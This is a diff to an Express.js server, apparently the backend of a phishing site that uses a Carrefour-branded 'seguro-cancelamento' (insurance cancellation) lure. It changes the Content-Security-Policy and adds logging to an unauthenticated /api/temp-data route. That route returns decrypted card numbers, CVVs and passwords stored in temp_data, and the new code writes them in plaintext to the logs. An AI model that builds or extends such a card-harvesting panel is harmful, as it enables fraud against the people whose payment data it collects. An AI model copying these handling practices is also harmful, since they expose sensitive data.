@@ -58,7 +58,7 @@ app.use(limiter);
 // Middleware to parse JSON bodies
 app.use(bodyParser.json());
 
-// Middleware de segurança com CSP
+// Middleware de segurança com CSP (ajustado para incluir cdn.tailwindcss.com)
 app.use((req, res, next) => {
     const proto = req.headers['x-forwarded-proto'] || req.protocol;
     if (proto !== 'https' && req.hostname !== 'localhost') {
@@ -67,7 +67,7 @@ app.use((req, res, next) => {
     }
     res.setHeader(
         'Content-Security-Policy',
-        "default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; script-src 'self' https://cdnjs.cloudflare.com; connect-src 'self' wss://seguro-cancelamento.onrender.com; img-src 'self' data: https://*.carrefour.com; upgrade-insecure-requests"
+        "default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; script-src 'self' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com; connect-src 'self' wss://seguro-cancelamento.onrender.com; img-src 'self' data: https://*.carrefour.com; upgrade-insecure-requests"
     );
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
@@ -355,17 +355,25 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
     }
 });
 
+// Rotas de dados com depuração adicional para /api/temp-data
 app.get('/api/temp-data', async (req, res) => {
     try {
+        console.log('Recebendo requisição para /api/temp-data');
         const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
-        const decryptedRows = result.rows.map(row => ({
-            ...row,
-            card_number: row.card_number ? decrypt(row.card_number) : null,
-            cvv: row.cvv ? decrypt(row.cvv) : null,
-            password: row.password ? decrypt(row.password) : null
-        }));
+        console.log('Dados brutos do temp_data:', result.rows);
+        const decryptedRows = result.rows.map(row => {
+            console.log('Descriptografando linha:', row);
+            return {
+                ...row,
+                card_number: row.card_number ? decrypt(row.card_number) : null,
+                cvv: row.cvv ? decrypt(row.cvv) : null,
+                password: row.password ? decrypt(row.password) : null
+            };
+        });
+        console.log('Dados descriptografados:', decryptedRows);
         res.json(decryptedRows);
     } catch (error) {
+        console.error('Erro em /api/temp-data:', error.message, 'Stack:', error.stack);
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
